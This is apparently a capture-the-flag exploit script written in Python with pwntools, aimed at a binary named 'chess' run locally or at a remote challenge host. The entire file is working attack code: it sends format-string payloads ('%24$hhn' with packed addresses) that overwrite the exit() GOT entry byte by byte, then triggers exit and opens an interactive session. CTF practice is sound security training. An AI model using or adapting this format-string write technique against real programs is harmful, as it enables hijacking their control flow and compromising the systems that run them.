#!/usr/bin/python3
from pwn import *

LOCAL = True
context.arch = "amd64"

def start():
    if LOCAL:
        r = process("./chess")
    else:
        r = remote("challenges.ctfd.io", 30458)

    r.recvuntil("Quit\n\n")
    r.sendline("1")
    r.recvuntil(">> ")
    r.sendline("AAAAAAAA")
    r.recvuntil(">> ")

    already_written = "\nCongratulations AAAAAAAA! Your answer was correct!\n\nYour winning move was: \nRa1 BBB"

    # overwrite exit() got entry
    r.sendline(b"Ra1 BBB" + b"%" + str(0xc2 - len(already_written)).encode() + b"c" + b"%24$hhn" + p64(0x404068))
    r.recvuntil("Ra1 ")

    r.sendline(b"Qg7 BBB" + b"%189c" + b"%24$hhn" + p64(0x404068 + 1))
    r.recvuntil("Qg7 ")

    # trigger call to exit
    r.sendline("X")
    r.interactive()

start()
